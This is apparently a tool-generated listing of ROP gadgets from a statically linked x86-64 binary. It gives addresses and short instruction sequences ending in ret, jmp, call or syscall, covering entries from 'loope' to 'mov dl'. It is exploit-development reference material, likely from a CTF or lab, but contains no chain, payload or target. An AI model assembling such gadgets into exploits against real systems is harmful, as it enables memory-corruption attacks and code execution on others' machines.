0x0000000000435379 : loope 0x435376 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x0000000000437e9a : loope 0x437e95 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x0000000000437e99 : loope 0x437e96 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x000000000044560b : loope 0x445615 ; add byte ptr [rax], al ; lea rax, [rdi + 0xf] ; ret
0x0000000000448ffe : loope 0x448ff5 ; ret
0x000000000044e9ae : loope 0x44e9bb ; pop rbx ; shl eax, cl ; pop rbp ; pop r12 ; ret
0x000000000047494e : loope 0x474963 ; je 0x474974 ; ret
0x000000000047cb1b : loope 0x47cb21 ; dec dword ptr [rcx - 0x77] ; ret
0x0000000000482e97 : loope 0x482ee9 ; mov dword ptr [rdi], ecx ; ret
0x0000000000482ec8 : loope 0x482f1b ; mov dword ptr [rdi - 8], ecx ; ret
0x0000000000482f3d : loope 0x482f90 ; mov dword ptr [rdi - 0x10], ecx ; ret
0x0000000000490246 : loope 0x4902a5 ; ret
0x0000000000490f0e : loope 0x490f70 ; pop rbp ; pop r12 ; ret
0x0000000000494665 : loope 0x494666 ; inc dword ptr [rax - 0x1d] ; stc ; jmp qword ptr [rax]
0x0000000000494685 : loope 0x494682 ; jmp qword ptr [rax]
0x0000000000494684 : loope 0x494683 ; jmp qword ptr [rax]
0x00000000004946a5 : loope 0x4946a6 ; inc dword ptr [rax] ; jrcxz 0x4946aa ; jmp rax
0x00000000004a8ad1 : loope 0x4a8b53 ; pop rdx ; leave ; retf
0x000000000040dd0c : loopne 0x40dd27 ; add byte ptr [rax], al ; add rsp, 8 ; ret
0x00000000004101f7 : loopne 0x41025d ; pop r12 ; pop r13 ; pop r14 ; pop rbp ; ret
0x000000000041d28c : loopne 0x41d2a0 ; xchg eax, esp ; ret 0x3de9
0x0000000000422c0f : loopne 0x422c75 ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x000000000042e731 : loopne 0x42e748 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x000000000042e730 : loopne 0x42e749 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x000000000042e881 : loopne 0x42e898 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x000000000042e880 : loopne 0x42e899 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x000000000042e9d1 : loopne 0x42e9e8 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x000000000042e9d0 : loopne 0x42e9e9 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x000000000042eb21 : loopne 0x42eb38 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x000000000042eb20 : loopne 0x42eb39 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x000000000042ec71 : loopne 0x42ec88 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x000000000042ec70 : loopne 0x42ec89 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x000000000042edc1 : loopne 0x42edd8 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x000000000042edc0 : loopne 0x42edd9 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x000000000042ef11 : loopne 0x42ef28 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x000000000042ef10 : loopne 0x42ef29 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x000000000042f05f : loopne 0x42f076 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x000000000042f05e : loopne 0x42f077 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x000000000042f1b1 : loopne 0x42f1c8 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x000000000042f1b0 : loopne 0x42f1c9 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x000000000042f301 : loopne 0x42f318 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x000000000042f300 : loopne 0x42f319 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x000000000042f451 : loopne 0x42f468 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x000000000042f450 : loopne 0x42f469 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x000000000042f5a1 : loopne 0x42f5b8 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x000000000042f5a0 : loopne 0x42f5b9 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x000000000042f6f1 : loopne 0x42f708 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x000000000042f6f0 : loopne 0x42f709 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x000000000042f841 : loopne 0x42f858 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x000000000042f840 : loopne 0x42f859 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x000000000042f991 : loopne 0x42f9a8 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x000000000042f990 : loopne 0x42f9a9 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000431101 : loopne 0x431118 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000431100 : loopne 0x431119 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000431251 : loopne 0x431268 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000431250 : loopne 0x431269 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00000000004313a1 : loopne 0x4313b8 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00000000004313a0 : loopne 0x4313b9 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00000000004314f1 : loopne 0x431508 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00000000004314f0 : loopne 0x431509 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000431641 : loopne 0x431658 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000431640 : loopne 0x431659 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000431791 : loopne 0x4317a8 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000431790 : loopne 0x4317a9 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00000000004318e1 : loopne 0x4318f8 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00000000004318e0 : loopne 0x4318f9 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000431a2f : loopne 0x431a46 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000431a2e : loopne 0x431a47 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000431b81 : loopne 0x431b98 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000431b80 : loopne 0x431b99 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000431cd1 : loopne 0x431ce8 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000431cd0 : loopne 0x431ce9 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000431e21 : loopne 0x431e38 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000431e20 : loopne 0x431e39 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000431f71 : loopne 0x431f88 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000431f70 : loopne 0x431f89 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00000000004320c1 : loopne 0x4320d8 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00000000004320c0 : loopne 0x4320d9 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000432211 : loopne 0x432228 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000432210 : loopne 0x432229 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000432361 : loopne 0x432378 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x0000000000432360 : loopne 0x432379 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00000000004489ed : loopne 0x448a07 ; movsxd rcx, dword ptr [rsi + rax*4] ; add rcx, rsi ; jmp rcx
0x000000000044c768 : loopne 0x44c77d ; cmp eax, 4 ; je 0x44c777 ; ret
0x000000000044e9b2 : loopne 0x44ea15 ; pop r12 ; ret
0x000000000045574d : loopne 0x4557c8 ; jae 0x4556de ; retf 0xb941
0x000000000046374f : loopne 0x4636dc ; ret
0x000000000046d8ba : loopne 0x46d8c0 ; dec dword ptr [rcx + 0x63] ; ret
0x000000000046ede9 : loopne 0x46ee4d ; pop rbp ; pop r12 ; pop r13 ; ret
0x000000000046f5c5 : loopne 0x46f629 ; pop rbp ; pop r12 ; pop r13 ; ret
0x000000000048286d : loopne 0x482876 ; sub eax, 1 ; ret
0x000000000049425c : loopne 0x494293 ; stc ; inc dword ptr [rax] ; xor cl, bh ; jmp qword ptr [rax]
0x000000000049432c : loopne 0x4943a3 ; stc ; call rax
0x00000000004944b4 : loopne 0x494479 ; stc ; jmp rax
0x00000000004944b8 : loopne 0x49447f ; stc ; jmp rax
0x0000000000494554 : loopne 0x494518 ; stc ; jmp rax
0x0000000000494558 : loopne 0x49451e ; stc ; jmp rax
0x0000000000494690 : loopne 0x49467b ; stc ; call rax
0x0000000000494690 : loopne 0x49467f ; stc ; call rax
0x00000000004946c5 : loopne 0x4946c2 ; call rax
0x0000000000494725 : loopne 0x494722 ; jmp qword ptr [rax]
0x0000000000494724 : loopne 0x494723 ; jmp qword ptr [rax]
0x0000000000494745 : loopne 0x494742 ; call rax
0x0000000000494cc0 : loopne 0x494cb0 ; stc ; jmp qword ptr [rax]
0x00000000004a70f4 : loopne 0x4a70d4 ; cld ; test al, 0x97 ; xchg eax, esp ; ret
0x00000000004af8b0 : loopne 0x4af8af ; clc ; call qword ptr [rax]
0x00000000004b0a99 : loopne 0x4b0a96 ; call qword ptr [rax]
0x00000000004a6b0a : mov ah, 0x13 ; ret
0x000000000049218a : mov ah, 0x24 ; cwde ; add byte ptr [rax], al ; add byte ptr [rcx + rcx*4 - 0x11], cl ; call rax
0x00000000004918ea : mov ah, 0x24 ; cwde ; add byte ptr [rax], al ; add byte ptr [rcx + rcx*4 - 1], cl ; call rax
0x0000000000494eb0 : mov ah, 0x3a ; cli ; inc dword ptr [rdx + rdi - 6] ; call rsp
0x000000000049626c : mov ah, 0x6e ; sti ; jmp qword ptr [rax]
0x00000000004b4210 : mov ah, 0x88 ; add byte ptr [rax], al ; jl 0x4b41e6 ; cld ; call rdx
0x00000000004a6fb0 : mov ah, 0xa5 ; ret
0x00000000004a6904 : mov ah, bl ; push rsi ; ret
0x000000000048b066 : mov al, 0 ; add byte ptr [rax], al ; ret
0x00000000004581f4 : mov al, 0 ; add byte ptr [rax], al ; xor r9d, r9d ; call r15
0x00000000004b4a00 : mov al, 0 ; std ; jmp qword ptr [rdx]
0x0000000000494a1c : mov al, 0x16 ; cli ; inc dword ptr [rax + 0x16] ; cli ; call rax
0x0000000000494804 : mov al, 0x19 ; cli ; inc dword ptr [rax + 0x19] ; cli ; call rax
0x0000000000490ec1 : mov al, 0x22 ; add byte ptr [rax + 0x39], cl ; ret
0x0000000000495170 : mov al, 0x30 ; cli ; jmp qword ptr [rax]
0x0000000000494f14 : mov al, 0x3d ; cli ; inc dword ptr [rax + 0x3d] ; cli ; call rax
0x00000000004ab9b0 : mov al, 0x51 ; cmc ; call qword ptr [rbx]
0x00000000004942d4 : mov al, 0x58 ; stc ; jmp qword ptr [rax]
0x00000000004b2e0c : mov al, 0x74 ; add byte ptr [rax], al ; adc bl, bh ; sti ; jmp qword ptr [rbx]
0x0000000000494338 : mov al, 0x75 ; stc ; jmp rax
0x00000000004b59d0 : mov al, 0x83 ; std ; call qword ptr [rbx]
0x00000000004b00b0 : mov al, 0x9d ; stc ; jmp qword ptr [rcx]
0x000000000044102f : mov al, 0xc5 ; std ; xlatb ; ret
0x00000000004947c0 : mov al, 0xc6 ; stc ; inc dword ptr [rax - 0x2f000637] ; retf 0xfff9
0x000000000048f5d4 : mov al, 0xcd ; and al, byte ptr [rax] ; test eax, eax ; je 0x48f5e9 ; ret
0x000000000048d90f : mov al, 0xe8 ; retf
0x00000000004a8db6 : mov al, 0xee ; fcmovb st(0), st(3) ; ret
0x0000000000494c08 : mov al, 0xf ; cli ; jmp qword ptr [rax]
0x000000000040475f : mov al, 0xf ; retf
0x0000000000495364 : mov al, 0xf7 ; cli ; inc eax ; idiv edx ; call rax
0x0000000000495398 : mov al, 0xf8 ; cli ; call rax
0x00000000004945f5 : mov al, 0xf9 ; call qword ptr [rax]
0x00000000004953b8 : mov al, 0xf9 ; cli ; call rax
0x0000000000494154 : mov al, 0xfa ; clc ; jmp rax
0x000000000046375b : mov al, byte ptr [rbx - 0x76ffffe6] ; ret 0xc389
0x0000000000442e06 : mov al, byte ptr [rcx + 2] ; mov byte ptr [rdx + 2], al ; mov rax, rdi ; ret
0x0000000000442e24 : mov al, byte ptr [rcx + 4] ; mov byte ptr [rdx + 4], al ; mov rax, rdi ; ret
0x0000000000444590 : mov al, byte ptr [rcx] ; mov byte ptr [rdx], al ; lea rax, [rdx] ; ret
0x0000000000442de0 : mov al, byte ptr [rcx] ; mov byte ptr [rdx], al ; mov rax, rdi ; ret
0x0000000000402bdc : mov al, ch ; out dx, al ; ret
0x0000000000442df0 : mov ax, word ptr [rcx] ; mov word ptr [rdx], ax ; mov rax, rdi ; ret
0x0000000000436141 : mov bh, 0x16 ; mov word ptr [rdi], dx ; ret
0x000000000044ea95 : mov bh, 0x26 ; add byte ptr [rsi + rbp*4 - 0x18], dh ; xchg eax, ecx ; retf 0
0x00000000004a8e40 : mov bh, 0x38 ; push 0xfd4cbe ; retf 0xf64
0x0000000000458854 : mov bh, 0x43 ; add al, 0x89 ; retf
0x00000000004583cf : mov bh, 0x47 ; or cl, byte ptr [rax + 0x39] ; ret 0x1176
0x00000000004454a8 : mov bh, 0x48 ; lea eax, [rdi + 7] ; ret
0x00000000004a9118 : mov bh, 0x4e ; retf 0x9d7d
0x00000000004a7de4 : mov bh, 0xb4 ; mov edi, dword ptr [rdx] ; ret
0x00000000004a63c6 : mov bh, 0xc8 ; leave ; retf 0xcccb
0x0000000000413c79 : mov bh, 0xd8 ; add byte ptr [rax], al ; add byte ptr [rax - 0x39], cl ; ret 0xac20
0x0000000000424f25 : mov bh, 0xe7 ; add byte ptr [rax], al ; cmovne rax, rdx ; ret
0x00000000004944e1 : mov bh, 0xf9 ; call qword ptr [rax]
0x0000000000494501 : mov bh, 0xf9 ; jmp rax
0x000000000041e383 : mov bh, 0xff ; dec dword ptr [rax + 0x39] ; retf 0x2a74
0x000000000048f7e7 : mov bh, 0xff ; mov rax, rbx ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000487e8c : mov bh, 0xff ; nop ; add rsp, 8 ; ret
0x00000000004a94f3 : mov bh, 6 ; movsd dword ptr [rdi], dword ptr [rsi] ; int1 ; ret 0x5803
0x0000000000446d9e : mov bl, 0 ; add byte ptr [rax], al ; xor eax, eax ; ret
0x00000000004a917b : mov bl, 0x29 ; retf 0xbf4b
0x000000000047474c : mov bl, 0x48 ; mov eax, edx ; ret
0x000000000045ac62 : mov bl, 0x4c ; add edi, ebx ; jmp rdi
0x00000000004a8ec3 : mov bl, 0x8e ; ret 0xdcd9
0x0000000000416413 : mov bl, 0xd8 ; add byte ptr [rax], al ; add byte ptr [rax - 0x39], cl ; ret 0xac20
0x00000000004a9160 : mov bl, 0xe ; or dh, al ; mov ebx, dword ptr [rdx] ; retf 0x7272
0x00000000004add0d : mov bl, 0xf6 ; call qword ptr [rdi]
0x00000000004ab3a8 : mov bl, bh ; std ; jmp rax
0x00000000004ab3a7 : mov bl, dil ; std ; jmp rax
0x00000000004a6ae1 : mov bx, 0xf32d ; retf
0x0000000000402f5d : mov byte ptr [r11], r13b ; add byte ptr [rax + 1], cl ; retf 0x8948
0x0000000000481140 : mov byte ptr [r8 + 0x15], r15b ; syscall
0x000000000044ec6a : mov byte ptr [r8 - 0x7d], r9b ; ret 0x4830
0x0000000000481141 : mov byte ptr [rax + 0x15], bh ; syscall
0x000000000044c92a : mov byte ptr [rax + 0x28], 1 ; ret
0x00000000004a2c6c : mov byte ptr [rax + rax], 0 ; enter 4, 0 ; retf 4
0x000000000044ec6b : mov byte ptr [rax - 0x7d], cl ; ret 0x4830
0x00000000004b41fd : mov byte ptr [rax], al ; add byte ptr [rax - 0x37], ah ; cld ; jmp qword ptr [rcx]
0x000000000044c4cf : mov byte ptr [rax], al ; add byte ptr [rax], al ; pop rbx ; pop rbp ; ret
0x0000000000400e84 : mov byte ptr [rax], al ; add byte ptr [rax], al ; pop rbx ; ret
0x00000000004b4211 : mov byte ptr [rax], al ; add byte ptr [rcx + rcx*8 - 4], bh ; call rdx
0x00000000004b2fa8 : mov byte ptr [rbx], al ; cld ; jmp rdx
0x0000000000402f5e : mov byte ptr [rbx], ch ; add byte ptr [rax + 1], cl ; retf 0x8948
0x000000000046ecd7 : mov byte ptr [rcx + 0xf], 0x4f ; ret
0x000000000045a763 : mov byte ptr [rcx + rax - 0x3a], cl ; jmp rsi
0x000000000048af24 : mov byte ptr [rcx + rax - 0x40], cl ; jmp rax
0x0000000000405e8f : mov byte ptr [rcx], 0 ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000042104f : mov byte ptr [rcx], ch ; add byte ptr [rax + 0x39], cl ; ret
0x000000000045eaf3 : mov byte ptr [rcx], cl ; or dword ptr [rax], eax ; add byte ptr [rcx - 0x77], cl ; ret
0x00000000004451f8 : mov byte ptr [rdi + 0x10], dh ; lea rax, [rdi + 0x10] ; ret
0x0000000000444b68 : mov byte ptr [rdi + 0x10], dh ; ret
0x000000000044526e : mov byte ptr [rdi + 0x14], dh ; lea rax, [rdi + 0x14] ; ret
0x0000000000444bbe : mov byte ptr [rdi + 0x14], dh ; ret
0x00000000004452f0 : mov byte ptr [rdi + 0x18], dh ; lea rax, [rdi + 0x18] ; ret
0x0000000000444c40 : mov byte ptr [rdi + 0x18], dh ; ret
0x00000000004450a6 : mov byte ptr [rdi + 2], dh ; lea rax, [rdi + 2] ; ret
0x0000000000444a86 : mov byte ptr [rdi + 2], dh ; ret
0x00000000004450c2 : mov byte ptr [rdi + 4], dh ; mov dword ptr [rdi], ecx ; lea rax, [rdi + 4] ; ret
0x0000000000444aa2 : mov byte ptr [rdi + 4], dh ; mov dword ptr [rdi], ecx ; ret
0x0000000000444ae3 : mov byte ptr [rdi + 8], dh ; mov qword ptr [rdi], rcx ; ret
0x00000000004a9175 : mov byte ptr [rdi - 0x17ac8d3c], al ; mov bl, 0x29 ; retf 0xbf4b
0x000000000042fd5b : mov byte ptr [rdi - 1], dl ; ret
0x0000000000413260 : mov byte ptr [rdi], 0 ; mov rax, rdi ; ret
0x0000000000438e82 : mov byte ptr [rdi], cl ; ret
0x0000000000448765 : mov byte ptr [rdi], cl ; vzeroupper ; ret
0x0000000000445080 : mov byte ptr [rdi], dh ; lea rax, [rdi] ; ret
0x0000000000444a60 : mov byte ptr [rdi], dh ; ret
0x00000000004361b3 : mov byte ptr [rdi], dl ; ret
0x00000000004445b9 : mov byte ptr [rdx + 2], al ; lea rax, [rdx + 2] ; ret
0x0000000000442e09 : mov byte ptr [rdx + 2], al ; mov rax, rdi ; ret
0x00000000004445e7 : mov byte ptr [rdx + 4], al ; lea rax, [rdx + 4] ; ret
0x0000000000442e27 : mov byte ptr [rdx + 4], al ; mov rax, rdi ; ret
0x0000000000444592 : mov byte ptr [rdx], al ; lea rax, [rdx] ; ret
0x0000000000442de2 : mov byte ptr [rdx], al ; mov rax, rdi ; ret
0x000000000048ba90 : mov byte ptr [rip + 0x230719], 8 ; ret
0x0000000000400b06 : mov byte ptr [rip + 0x2ba7d3], 1 ; pop rbp ; ret
0x000000000041e539 : mov byte ptr [rsi + rbx], cl ; mov rax, rsi ; pop rbx ; ret
0x000000000048486f : mov byte ptr [rsi], al ; jne 0x48485f ; mov rax, rsi ; ret
0x00000000004848f3 : mov byte ptr [rsi], al ; jne 0x4848d7 ; mov rax, rsi ; ret
0x000000000042104e : mov byte ptr cs:[rcx], ch ; add byte ptr [rax + 0x39], cl ; ret
0x00000000004a6902 : mov ch, 0x31 ; mov ah, bl ; push rsi ; ret
0x00000000004a7c43 : mov ch, 0x36 ; push rcx ; call qword ptr [rsi]
0x000000000040f50a : mov ch, 0x41 ; mov ebx, 1 ; jmp 0x40f4dd
0x000000000040fc42 : mov ch, 0x41 ; mov ebx, 1 ; jmp 0x40fc15
0x00000000004a88d6 : mov ch, 0x41 ; outsb dx, byte ptr [rsi] ; sbb edi, ebp ; retf
0x00000000004a8fdf : mov ch, 0x99 ; in eax, 0xff ; lahf ; mov dh, 0xc7 ; ret 0xe71f
0x00000000004a998a : mov ch, 0xab ; ret
0x00000000004714e7 : mov ch, 0xd8 ; add byte ptr [rax], al ; add byte ptr [rax - 0x39], cl ; ret 0xac20
0x0000000000495339 : mov ch, 0xfa ; call qword ptr [rax + 0x20fffaa1]
0x00000000004b1d21 : mov ch, 0xfa ; call qword ptr [rbx]
0x0000000000419947 : mov ch, 0xfe ; sub dword ptr [rax], eax ; ret
0x000000000042da76 : mov ch, 6 ; add byte ptr [rax], al ; xor eax, eax ; ret
0x00000000004033ff : mov ch, byte ptr [rbx] ; add al, ch ; stc ; retf
0x00000000004232f1 : mov ch, byte ptr [rcx] ; add dh, dh ; ret 0xf02
0x00000000004a93e1 : mov cl, 0x3f ; retf
0x00000000004943ac : mov cl, 0x9a ; stc ; inc dword ptr [rcx - 0x65] ; stc ; call rcx
0x0000000000451b6b : mov cl, 0xf ; retf 0xd285
0x00000000004afc31 : mov cl, bh ; call qword ptr [rax]
0x00000000004afbf5 : mov cl, bh ; call qword ptr [rdx]
0x00000000004afc45 : mov cl, bh ; jmp rbx
0x000000000045b367 : mov cl, byte ptr [rax + 0x39] ; ror byte ptr [rax + 0xf], 1 ; ret 0x8b41
0x000000000043b665 : mov cl, byte ptr [rbx - 0x37d67dfc] ; ret
0x00000000004251a4 : mov cl, byte ptr [rdi - 0x73] ; adc al, 0xa ; jmp r10
0x00000000004a8db2 : mov cl, byte ptr [rip - 0x114f09b0] ; fcmovb st(0), st(3) ; ret
0x000000000042c8c4 : mov cl, byte ptr [rsi + rdx - 1] ; sub eax, ecx ; ret
0x0000000000438e80 : mov cl, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x000000000047494b : mov cl, dl ; and cl, 0xf ; je 0x474977 ; ret
0x00000000004a906c : mov cs, edi ; ret 0x8b36
0x000000000048f6f2 : mov cs, esp ; and al, byte ptr [rax] ; add dword ptr [rax], eax ; add byte ptr [rax], al ; ret
0x00000000004681e2 : mov cs, word ptr [rdx - 0x77000000] ; ror byte ptr [rcx - 0x77], cl ; ret
0x000000000043fbee : mov cs, word ptr [rip - 0x7cb80000] ; ret 0xe910
0x0000000000444a80 : mov cx, word ptr [rsi] ; mov word ptr [rdi], cx ; mov byte ptr [rdi + 2], dh ; ret
0x000000000048499a : mov dh, 0 ; add byte ptr [rax], al ; add rsp, 0x30 ; pop rbx ; ret
0x000000000048e14f : mov dh, 0 ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x0000000000417022 : mov dh, 0 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x000000000041350f : mov dh, 0 ; pop r12 ; pop r13 ; pop r14 ; ret
0x00000000004190b0 : mov dh, 0 ; ret
0x00000000004361b1 : mov dh, 0x16 ; mov byte ptr [rdi], dl ; ret
0x000000000042c414 : mov dh, 0x16 ; sub eax, edx ; ret
0x000000000040dbd4 : mov dh, 0x17 ; test dl, dl ; jne 0x40dbba ; ret
0x000000000049484c : mov dh, 0x18 ; cli ; inc dword ptr [rsi + 0x18] ; cli ; call rsi
0x00000000004667be : mov dh, 0x34 ; add dword ptr [rbp - 0x41f040be], ecx ; retf 0x53c
0x0000000000494d44 : mov dh, 0x3f ; cli ; inc dword ptr [rsi + 0x3f] ; cli ; call rsi
0x0000000000457168 : mov dh, 0x40 ; add cl, byte ptr [rax - 0x73] ; add rcx, qword ptr [rax + 0x39] ; retf
0x000000000046ecec : mov dh, 0x40 ; add dword ptr [rcx - 0x77], eax ; ret 0xe883
0x000000000045717e : mov dh, 0x40 ; add ecx, dword ptr [rax + 0x39] ; retf
0x000000000040daf9 : mov dh, 0x40 ; or dword ptr [rax + rax*8 - 0x38b79f8c], eax ; ret 0xfff0
0x0000000000457192 : mov dh, 0x41 ; dec dword ptr [rax - 0x7d] ; ret 0x8801
0x000000000046960b : mov dh, 0x46 ; or al, 0x83 ; ret
0x0000000000446971 : mov dh, 0x47 ; cmc ; movzx edx, byte ptr [rsi - 0xb] ; sub eax, edx ; ret
0x0000000000446961 : mov dh, 0x47 ; hlt ; movzx edx, byte ptr [rsi - 0xc] ; sub eax, edx ; ret
0x0000000000446931 : mov dh, 0x47 ; int1 ; movzx edx, byte ptr [rsi - 0xf] ; sub eax, edx ; ret
0x0000000000446951 : mov dh, 0x47 ; movzx edx, byte ptr [rsi - 0xd] ; sub eax, edx ; ret
0x0000000000446941 : mov dh, 0x47 ; movzx edx, byte ptr [rsi - 0xe] ; sub eax, edx ; ret
0x000000000045e1e9 : mov dh, 0x47 ; or al, 0x83 ; ret
0x0000000000488137 : mov dh, 0x49 ; add al, 0x89 ; retf 0xeac0
0x0000000000454b9d : mov dh, 0x4e ; add dword ptr [rcx - 0x77], eax ; retf
0x0000000000454bde : mov dh, 0x4e ; add eax, dword ptr [rcx - 0x77] ; retf
0x00000000004a7da2 : mov dh, 0x4e ; ret 0x474c
0x0000000000446975 : mov dh, 0x56 ; cmc ; sub eax, edx ; ret
0x0000000000446965 : mov dh, 0x56 ; hlt ; sub eax, edx ; ret
0x0000000000446935 : mov dh, 0x56 ; int1 ; sub eax, edx ; ret
0x0000000000446945 : mov dh, 0x56 ; sub eax, edx ; ret
0x0000000000463478 : mov dh, 0x67 ; or al, 0x89 ; ret 0xc689
0x000000000040602a : mov dh, 0x73 ; add dword ptr [rax - 0x77], ecx ; ret
0x000000000040efe4 : mov dh, 0x73 ; add dword ptr [rax - 0x7d], ecx ; ret
0x0000000000455ca6 : mov dh, 0x78 ; add cl, byte ptr [rax + 0x39] ; retf
0x000000000048be81 : mov dh, 0x78 ; add cl, byte ptr [rax - 0x7d] ; rol byte ptr [rdx], 0xe9 ; retf 0xfffc
0x0000000000455c91 : mov dh, 0x78 ; add dword ptr [rax + 0x39], ecx ; retf
0x0000000000455cbb : mov dh, 0x78 ; add ecx, dword ptr [rax + 0x39] ; retf
0x0000000000455fe4 : mov dh, 0x7a ; add cl, byte ptr [rax - 0x73] ; add rcx, qword ptr [rax + 0x39] ; retf
0x0000000000478ddf : mov dh, 0x87 ; adc eax, 0x89000003 ; ret 0xe8c0
0x0000000000475952 : mov dh, 0xc0 ; add rsp, 0x58 ; ret
0x000000000048c196 : mov dh, 0xc0 ; movsxd rax, dword ptr [r12 + rax*4] ; add rax, r12 ; jmp rax
0x000000000046ea68 : mov dh, 0xc0 ; movsxd rax, dword ptr [rsi + rax*4] ; add rax, rsi ; jmp rax
0x00000000004884ed : mov dh, 0xc0 ; neg eax ; ret
0x0000000000484dba : mov dh, 0xc0 ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000044f141 : mov dh, 0xc0 ; xor edx, edx ; add eax, 1 ; push rax ; call rbx
0x0000000000448a51 : mov dh, 0xc1 ; pop rbx ; ret
0x0000000000415e22 : mov dh, 0xc5 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00000000004a8fe4 : mov dh, 0xc7 ; ret 0xe71f
0x000000000048af1f : mov dh, 0xc9 ; movsxd rax, dword ptr [r8 + rcx*4] ; add rax, r8 ; jmp rax
0x000000000042c43a : mov dh, 0xd2 ; sub eax, edx ; ret
0x000000000048c6cf : mov dh, 0xdb ; movsxd rax, dword ptr [r9 + r11*4] ; add rax, r9 ; jmp rax
0x0000000000447879 : mov dh, 0xe ; mov byte ptr [rdi], cl ; ret
0x0000000000426551 : mov dh, 0xe ; movzx eax, byte ptr [rdi] ; sub eax, ecx ; ret
0x000000000042c8d4 : mov dh, 0xe ; sub eax, ecx ; ret
0x000000000040d635 : mov dh, 0xfa ; movsxd rdi, dword ptr [r10 + rdi*4] ; add rdi, r10 ; jmp rdi
0x0000000000417031 : mov dh, 2 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x0000000000413521 : mov dh, 2 ; ret
0x000000000042c8d1 : mov dh, 7 ; movzx ecx, byte ptr [rsi] ; sub eax, ecx ; ret
0x000000000042c411 : mov dh, 7 ; movzx edx, byte ptr [rsi] ; sub eax, edx ; ret
0x0000000000426554 : mov dh, 7 ; sub eax, ecx ; ret
0x0000000000448ffc : mov dh, byte ptr [rcx - 0xd] ; ret
0x000000000045b42a : mov dh, dh ; and eax, 0xf3087400 ; ret
0x00000000004948f0 : mov dl, 0x14 ; cli ; inc dword ptr [rdx + 0x14] ; cli ; call rdx
0x0000000000494de8 : mov dl, 0x3b ; cli ; inc dword ptr [rdx + 0x3b] ; cli ; call rdx
0x000000000040eb5d : mov dl, 0x6b ; add byte ptr [rax + 0x39], cl ; ret
0x0000000000414062 : mov dl, 0x6b ; add byte ptr [rax - 0x77], cl ; ret 0x294c
0x00000000004139e8 : mov dl, 0x6b ; add byte ptr [rax - 0x77], cl ; ret 0x294d
0x0000000000494639 : mov dl, 0xf9 ; call rax
0x0000000000494af8 : mov dl, 9 ; cli ; jmp qword ptr [rdx]
0x000000000042fde0 : mov dl, byte ptr [rsi - 1] ; mov byte ptr [rdi - 1], dl ; ret
